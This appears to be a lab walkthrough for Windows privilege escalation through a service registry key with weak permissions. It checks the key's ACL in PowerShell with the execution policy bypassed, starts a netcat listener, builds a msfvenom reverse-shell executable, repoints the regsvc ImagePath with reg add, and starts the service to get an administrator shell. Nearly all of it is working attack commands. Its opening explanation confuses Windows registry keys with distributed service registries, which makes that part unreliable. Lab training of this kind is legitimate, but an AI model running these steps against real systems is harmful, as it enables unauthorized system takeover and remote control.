# <span style="color:lightblue">Service Registry</span>

## <span style="color:lightgreen">Methodology</span>
A service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access. 

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. Open powershell prompt and type: 
```powershell
C:\Temp> powershell -ep bypass
PS C:\Temp> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
![image](https://user-images.githubusercontent.com/59029171/161015556-54353fa3-1278-451d-999e-38c3cc762f75.png)

2. Notice that the output suggests that user belong to `"NT AUTHORITY\INTERACTIVE"` has `"FullContol"` permission over the registry key.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```
3. Copy the generated file `x.exe`, to the Windows VM.

### Windows VM

1. Place `x.exe` in `'C:\Temp'`
2. Open command prompt at type: 
```console
C:\Temp> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
3. In the command prompt type: 
```console
C:\Temp> sc start regsvc
# If it doesnt work try restaring the service and perform the exploit egain
```

![image](https://user-images.githubusercontent.com/59029171/161016977-7757f360-5b46-4201-949a-9338e79f5735.png)

### Kali VM

1. Wait for a reverse shell on your kali machine.


